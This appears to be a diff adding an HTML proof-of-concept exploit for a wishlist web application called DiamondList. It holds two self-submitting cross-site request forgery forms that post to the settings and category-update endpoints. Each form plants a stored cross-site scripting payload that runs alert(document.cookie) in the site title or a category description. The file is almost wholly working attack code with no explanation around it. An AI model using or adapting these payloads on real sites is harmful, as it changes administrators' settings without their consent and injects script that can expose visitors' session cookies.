@@ -1,0 +1,23 @@
+&lt;form action=&quot;http://www.example.com/user/main/update_settings&quot; method=&quot;post&quot;  name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[site_title]&quot; value='Wishlists&lt;/title&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[site_keywords]&quot; value=&quot;wishlists, applications&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[site_description]&quot; value=&quot;Powered by DiamondList&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[theme]&quot; value=&quot;default&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;commit&quot; value=&quot;Save Settings&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+
+&lt;form action=&quot;http://www.example.com/user/main/update_category/CATEGORY_ID&quot; method=&quot;post&quot;  name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;category[name]&quot; value=&quot;some cat name&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;category[description]&quot; value='descr&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;commit&quot; value=&quot;Update&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
